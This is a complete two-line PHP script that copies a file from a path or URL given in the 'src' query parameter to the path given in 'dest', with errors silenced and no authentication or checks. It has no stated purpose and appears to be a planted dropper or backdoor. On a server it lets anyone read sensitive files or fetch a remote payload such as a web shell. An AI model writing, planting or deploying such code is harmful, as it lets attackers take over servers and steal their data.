<?php
	@copy($_GET['src'], $_GET['dest']);

?>
